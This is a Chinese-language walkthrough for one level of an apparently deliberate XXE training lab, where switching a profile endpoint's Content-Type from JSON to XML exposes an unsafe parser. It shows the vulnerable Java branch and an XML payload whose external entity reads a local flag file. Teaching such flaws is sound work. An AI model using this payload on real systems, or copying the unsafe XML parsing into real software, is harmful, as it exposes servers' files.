# Level 3 — Content-Type切换XXE

## 关卡说明

本关模拟用户资料更新功能，前端使用JSON格式提交，但后端同时支持XML。攻击者只需切换Content-Type为XML并提交恶意XML即可触发XXE。

**目标**：发现隐藏的XML支持，构造XXE Payload获取当前关卡的 Flag。

## 漏洞原理

接口路径：`POST /api/challenge/xxe/level3/profile/update`

**关键代码**：

```java
@PostMapping(value = "/profile/update", consumes = {"application/json", "application/xml", "text/xml"})
if (contentType.contains("xml")) {
    profile = parseXmlProfile(body);  // XML分支 — 存在XXE漏洞
} else {
    profile = parseJsonProfile(body);  // JSON分支 — 正常
}
```

**虚拟文件**：`/flag/xxe-level3` → 内容为 `XXE_LEVEL3_CONTENT_TYPE_2024`

## 通关步骤

### Step 1：正常JSON请求

```json
Content-Type: application/json
{"username": "alice", "email": "alice@test.com", "bio": "hello"}
```

### Step 2：切换为XML并注入

```
Content-Type: application/xml
```

```xml
<?xml version="1.0"?>
<!DOCTYPE profile [
  <!ENTITY xxe SYSTEM "file:///flag/xxe-level3">
]>
<profile>
    <username>&xxe;</username>
    <email>test@test.com</email>
    <bio>test</bio>
</profile>
```

### Step 3：获取 Flag

当解析结果中包含虚拟Flag文件内容时，响应中包含 Flag。

## 涉及文件

| 文件 | 说明 |
|------|------|
| `controller/challenge/xxe/XxeLevel3Controller.java` | 后端资料更新接口，同时支持JSON和XML |
| `service/FlagService.java` | Flag 获取与验证 |
